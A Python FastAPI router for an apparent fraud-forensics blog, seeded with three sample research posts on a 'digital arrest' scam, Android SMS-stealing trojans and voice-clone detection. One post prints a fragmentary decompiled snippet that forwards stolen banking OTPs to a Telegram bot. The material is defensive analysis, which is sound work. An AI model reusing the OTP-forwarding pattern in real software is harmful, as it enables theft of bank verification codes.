"""
NETRA Community Forensic Blog & Research API Routes
Allows logged-in users and researchers to compose, format, embed media,
and publish blogs to the public NETRA community.
"""

from fastapi import APIRouter, Query, HTTPException
from pydantic import BaseModel, Field
from typing import Optional, List, Dict, Any
from datetime import datetime
import uuid

router = APIRouter(prefix="/community", tags=["Community Blog & Research"])

class AuthorModel(BaseModel):
    id: Optional[str] = None
    name: str
    email: Optional[str] = None
    avatar: Optional[str] = None
    avatar_index: Optional[int] = None
    role: Optional[str] = None

class CommunityPostCreate(BaseModel):
    title: str = Field(..., min_length=3, max_length=200)
    category: str = Field(..., description="DEEPFAKE, SCAM_ANALYSIS, VOICE_CLONE, SAFETY_GUIDE, THREAT_INTEL")
    content: str = Field(..., min_length=10, description="Full markdown/rich article content")
    excerpt: Optional[str] = None
    cover_image: Optional[str] = None
    embed_url: Optional[str] = Field(None, description="YouTube, Twitter/X, or external video embed URL")
    author: AuthorModel

class CommunityPost(BaseModel):
    id: str
    title: str
    category: str
    content: str
    excerpt: str
    cover_image: Optional[str] = None
    embed_url: Optional[str] = None
    author: AuthorModel
    created_at: str
    read_time: str
    likes: int = 0
    views: int = 0
    tags: List[str] = []

# Persistent in-memory post storage initialized with realistic seed research blogs
COMMUNITY_POSTS: List[Dict[str, Any]] = [
    {
        "id": "post-001",
        "title": "Dissecting the 'Digital Arrest' Extortion Racket: Audio & Face-Swap Breakdown",
        "category": "SCAM_ANALYSIS",
        "excerpt": "A technical walkthrough of how transnational fraud syndicates use real-time face reenactment, fake police backdrops, and synthesized police warrants on Skype.",
        "content": """## Executive Summary

Over the past six months, Indian law enforcement agencies and the National Cybercrime Reporting Portal have reported a surging epidemic of **"Digital Arrest"** scams. Victims receive an urgent call claiming illegal parcels containing narcotics were intercepted at customs, followed by a coerced Skype video call with an impostor dressed in an official Indian Police or CBI uniform.

### How the Fraud Operates

1. **The Initial Robocall**: Victims are contacted by automated IVR stating their telecom connection or FedEx parcel has been seized.
2. **Transfer to Fake Officer**: Fraudsters transfer the victim to a handler operating on Telegram or Skype.
3. **Synthetic Video Session**: Using models like LivePortrait and real-time InSwapper, attackers overlay senior police faces onto an accomplice seated against an authentic-looking state police emblem.
4. **Coerced Fund Transfers**: Victims are threatened with immediate arrest and instructed to liquidate mutual funds or transfer balances into "verification RBI escrow accounts."

```
Attack Chain:
[Automated IVR Call] ➔ [Skype Video Reenactment] ➔ [Forged FIR/Notice PDF] ➔ [RTGS Fund Drain]
```

### Forensic Indicators Observed

- **Facial Boundary Artifacts**: When the fake officer moves their head laterally, edge blur and hairline warps occur around the 68-point facial landmark grid.
- **Audio Pitch Irregularities**: Low-frequency acoustic jitter (sub-80Hz) indicates ElevenLabs voice-cloning artifacts with zero ambient room reverberation.
- **Forged Letterhead Analysis**: OCR extraction reveals incorrect font kerning on emblem seals and nonexistent FIR case tracking numbers.

### Citizen Safety Advice

> **Important**: No Indian police department, CBI, or court ever conducts arrests or demands financial transfers over Skype, WhatsApp, or video calls. Always disconnect and dial **1930** immediately.
""",
        "cover_image": "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80",
        "embed_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "author": {
            "id": "author-aarav",
            "name": "Dr. Aarav Sharma",
            "email": "aarav.sharma@forensics.org",
            "avatar": "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&h=200&q=80",
            "avatar_index": 0
        },
        "created_at": "2 hours ago",
        "read_time": "4 min read",
        "likes": 42,
        "views": 380,
        "tags": ["Digital Arrest", "Skype Fraud", "Face-Swap", "I4C Alert"]
    },
    {
        "id": "post-002",
        "title": "Reverse-Engineering WhatsApp 'Police Notice' APKs: Hidden SMS Listeners",
        "category": "THREAT_INTEL",
        "excerpt": "Analyzing malicious Android APK packages distributed under the guise of official cybercell compliance notices and electricity bill updates.",
        "content": """## Threat Overview

We captured and decompiled 5 malicious Android applications circulating via WhatsApp and SMS phishing links in Mumbai, Bengaluru, and Delhi.

### Malware Architecture

The trojans pose as "Cyber Security Verification" utilities. Once installed by a panicked citizen, they request:
1. `RECEIVE_SMS` and `READ_SMS` (To intercept 2FA banking OTPs)
2. `BIND_ACCESSIBILITY_SERVICE` (To prevent manual uninstallation and auto-grant screen overlay permissions)

### Decompiled Smali Code Snippet
```java
public class SmsBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        // Steals incoming banking OTP and forwards to C2 Telegram Bot
        String botToken = "bot712891:AAHk...";
        ForwardToTelegram(botToken, extractedOtp);
    }
}
```

### Prevention
Never install `.apk` files received over WhatsApp, Telegram, or SMS. Legitimate government departments only distribute software through official Google Play and Apple App Stores.
""",
        "cover_image": "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80",
        "embed_url": None,
        "author": {
            "id": "author-priya",
            "name": "Priya Venkat",
            "email": "priya.v@threatintel.in",
            "avatar": "https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=200&h=200&q=80",
            "avatar_index": 1
        },
        "created_at": "5 hours ago",
        "read_time": "3 min read",
        "likes": 29,
        "views": 240,
        "tags": ["Android Malware", "SMS Sniffer", "Telegram C2", "Banking Security"]
    },
    {
        "id": "post-003",
        "title": "Voice Clone Forensics: How We Detect Synthetic Audio in Under 300ms",
        "category": "VOICE_CLONE",
        "excerpt": "A deep dive into mel-spectrogram residual analysis and vocal tract harmonic consistency to spot ElevenLabs and OpenVoice deepfakes.",
        "content": """## Introduction

Voice cloning technologies have made massive strides, enabling hyper-realistic impersonation of family members, corporate executives, and law enforcement personnel with as little as 3 seconds of audio sample data.

### The Forensic Detection Pipeline

1. **Mel-Spectrogram Generation**: Audio waveform slices are transformed using 80-bin Mel scale filters.
2. **Harmonic Overtone Analysis**: Biological vocal cords produce micro-tremors and natural airflow turbulence. Neural vocoders produce rigid periodic waveforms that leave distinct high-frequency phase discontinuities.
3. **Real-Time Classification**: A lightweight CNN + BiLSTM model analyzes harmonic residuals, delivering a synthetic confidence score in <300ms.

```
Incoming Audio Stream ➔ [Mel-Spectrogram] ➔ [Phase Discontinuity Check] ➔ [Synthetic Verdict: 98.4%]
```

### Key Takeaway
Whenever you receive an urgent call demanding ransom or wire transfers from a distressed loved one, **always hang up and call them back on their direct phone number** to verify their identity.
""",
        "cover_image": "https://images.unsplash.com/photo-1598488035139-bdbb2231ce04?auto=format&fit=crop&w=1200&q=80",
        "embed_url": None,
        "author": {
            "id": "author-rohan",
            "name": "Rohan Deshmukh",
            "email": "rohan.d@soundforensics.io",
            "avatar": "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&h=200&q=80",
            "avatar_index": 2
        },
        "created_at": "1 day ago",
        "read_time": "5 min read",
        "likes": 64,
        "views": 510,
        "tags": ["Voice Cloning", "ElevenLabs", "Audio Forensics", "Mel-Spectrogram"]
    }
]

@router.get("/posts")
async def get_community_posts(
    category: Optional[str] = Query(None),
    search: Optional[str] = Query(None),
    author_id: Optional[str] = Query(None),
    author_email: Optional[str] = Query(None)
):
    """
    Returns public community posts filtered by category, search term, or author.
    """
    posts = list(COMMUNITY_POSTS)
    
    if category and category.upper() != "ALL":
        posts = [p for p in posts if p.get("category", "").upper() == category.upper()]
        
    if author_id:
        posts = [p for p in posts if p.get("author", {}).get("id") == author_id]
        
    if author_email:
        posts = [p for p in posts if p.get("author", {}).get("email", "").lower() == author_email.lower()]
        
    if search:
        s = search.lower()
        posts = [
            p for p in posts
            if s in p.get("title", "").lower() 
            or s in p.get("excerpt", "").lower() 
            or s in p.get("content", "").lower()
            or s in p.get("author", {}).get("name", "").lower()
        ]
        
    return {
        "status": "success",
        "count": len(posts),
        "posts": posts
    }

@router.post("/posts")
async def create_community_post(post: CommunityPostCreate):
    """
    Publishes a new blog post to the public community.
    """
    new_id = f"post-{str(uuid.uuid4())[:8]}"
    
    # Calculate read time: ~200 words per min
    words = len(post.content.split())
    read_mins = max(1, round(words / 200))
    read_time = f"{read_mins} min read"
    
    # Generate excerpt if not provided
    excerpt = post.excerpt
    if not excerpt:
        # Take first 150 chars of content without markdown headers
        plain = post.content.replace("#", "").replace("*", "").replace(">", "").strip()
        excerpt = plain[:140] + ("..." if len(plain) > 140 else "")

    new_post = {
        "id": new_id,
        "title": post.title,
        "category": post.category,
        "content": post.content,
        "excerpt": excerpt,
        "cover_image": post.cover_image or "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80",
        "embed_url": post.embed_url,
        "author": post.author.dict(),
        "created_at": "Just now",
        "read_time": read_time,
        "likes": 1,
        "views": 1,
        "tags": [post.category.replace("_", " ").title()]
    }
    
    COMMUNITY_POSTS.insert(0, new_post)
    
    return {
        "status": "success",
        "message": "Post published successfully to the community.",
        "post": new_post
    }

@router.get("/posts/{post_id}")
async def get_community_post(post_id: str):
    """
    Retrieves a single community post and increments view counter.
    """
    for p in COMMUNITY_POSTS:
        if p.get("id") == post_id:
            p["views"] = p.get("views", 0) + 1
            return {"status": "success", "post": p}
            
    raise HTTPException(status_code=404, detail="Community post not found")

@router.post("/posts/{post_id}/like")
async def like_community_post(post_id: str):
    """
    Increments like counter for a post.
    """
    for p in COMMUNITY_POSTS:
        if p.get("id") == post_id:
            p["likes"] = p.get("likes", 0) + 1
            return {"status": "success", "likes": p["likes"]}
            
    raise HTTPException(status_code=404, detail="Community post not found")
